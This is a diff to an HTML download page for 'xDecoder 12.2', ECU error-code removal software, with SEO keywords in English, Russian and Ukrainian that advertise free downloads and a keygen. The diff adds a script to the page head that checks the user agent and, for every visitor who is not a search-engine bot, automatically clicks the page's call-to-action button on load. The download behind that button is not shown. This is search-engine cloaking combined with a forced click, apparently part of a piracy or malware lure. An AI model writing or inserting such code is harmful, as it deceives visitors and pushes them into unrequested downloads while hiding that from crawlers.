@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>xDecoder 12.2 07.06.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download xDecoder 12.2 (07.06.2024) to remove ECU error codes, now with beta support for Continental SID206 used by Ford.">
     <meta name="keywords" content="xDecoder 12.2, xDecoder 12.2 07.06.2024, xDecoder software, xDecoder 12.2 download, xDecoder 12.2 free download, xDecoder 12.2 keygen, xDecoder error code removal, xDecoder Ford CONTINENTAL SID206, xDecoder Ford BOSCH EDC17C70, xDecoder Toyota BOSCH ME17.9.5x, xDecoder Honda BOSCH MED17.9.3, xDecoder Ford BOSCH EDC17CP42, xDecoder Hyundai Kia KEFICO CPEGD2, xDecoder Renault CONTINENTAL SID310, xDecoder Bentley BOSCH ME7.1.1, xDecoder PSA SIEMENS SID803A, xDecoder Ford BOSCH MD1CP006, xDecoder FCA CONTINENTAL GPEC2, xDecoder Smart BOSCH ME17.7, xDecoder PSA DELPHI DCM7.1, xDecoder Toyota BOSCH ME7, скачать xDecoder, скачать xDecoder бесплатно, xDecoder Ford CONTINENTAL SID206 скачать, xDecoder Ford BOSCH EDC17C70 скачать, xDecoder Toyota BOSCH ME17.9.5x скачать, xDecoder без регистрации, загрузить xDecoder, загрузить xDecoder бесплатно, завантажити xDecoder, завантажити xDecoder безкоштовно, завантажити xDecoder 12.2, скачать xDecoder 12.2 07.06.2024 бесплатно">
     <style>
